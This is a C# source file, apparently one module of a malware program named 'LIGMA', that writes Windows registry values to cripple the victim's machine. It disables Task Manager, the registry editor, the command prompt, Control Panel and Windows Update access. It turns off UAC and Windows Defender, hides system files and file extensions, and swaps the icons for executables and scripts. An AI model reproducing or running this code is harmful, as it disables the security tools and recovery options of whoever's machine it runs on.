using Microsoft.Win32;

namespace LIGMA {

    class RegistryModifications {

        public static void MainRegistryModifications() {

            string extractPATH = @"C:\WinWOW32\";

            RegistryKey key;

            key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            key.SetValue("DisableTaskMgr", "1");
            key.Close();

            key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            key.SetValue("DisableRegistryTools", "1");
            key.Close();

            key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            key.SetValue("DisableCMD", "1");
            key.Close();

            key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
            key.SetValue("NoControlPanel", "1");
            key.Close();

            key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
            key.SetValue("HideClock", "1");
            key.Close();

            key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
            key.SetValue("NoLogoff", "1");
            key.Close();

            key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
            key.SetValue("NoWindowsUpdate", "1");
            key.Close();

            key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
            key.SetValue("NoDrives", "1");
            key.Close();

            key = Registry.ClassesRoot.CreateSubKey(@"txtfile\DefaultIcon");
            key.SetValue("", extractPATH + "\\icon.ico");
            key.Close();

            key = Registry.ClassesRoot.CreateSubKey(@"exefile\DefaultIcon");
            key.SetValue("", extractPATH + "\\icon.ico");
            key.Close();

            key = Registry.ClassesRoot.CreateSubKey(@"VBSFile\DefaultIcon");
            key.SetValue("", extractPATH + "\\icon.ico");
            key.Close();

            key = Registry.ClassesRoot.CreateSubKey(@"batfile\DefaultIcon");
            key.SetValue("", extractPATH + "\\icon.ico");
            key.Close();

            key = Registry.ClassesRoot.CreateSubKey(@"dllfile\DefaultIcon");
            key.SetValue("", extractPATH + "\\icon.ico");
            key.Close();

            key = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Winlogon");
            key.SetValue("AutoRestartShell", "0", RegistryValueKind.DWord);
            key.Close();

            key = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            key.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
            key.Close();

            key = Registry.LocalMachine.CreateSubKey(@"Software\Policies\Microsoft\Windows Defender");
            key.SetValue("DisableAntiSpyware", "1", RegistryValueKind.DWord);
            key.Close();

            key = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            key.SetValue("ConsentPromptBehaviorAdmin", "0", RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\MobilityCenter");
            key.SetValue("NoMobilityCenter", "1", RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
            key.SetValue("NoFolderOptions", "1", RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced");
            key.SetValue("Hidden", "2", RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced");
            key.SetValue("ShowSuperHidden", "0", RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced");
            key.SetValue("HideFileExt", "1", RegistryValueKind.DWord);
            key.Close();

            key = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            key.SetValue("legalnoticecaption", " ");
            key.Close();

            key = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            key.SetValue("legalnoticetext", " ");
            key.Close();
        }
    }
}
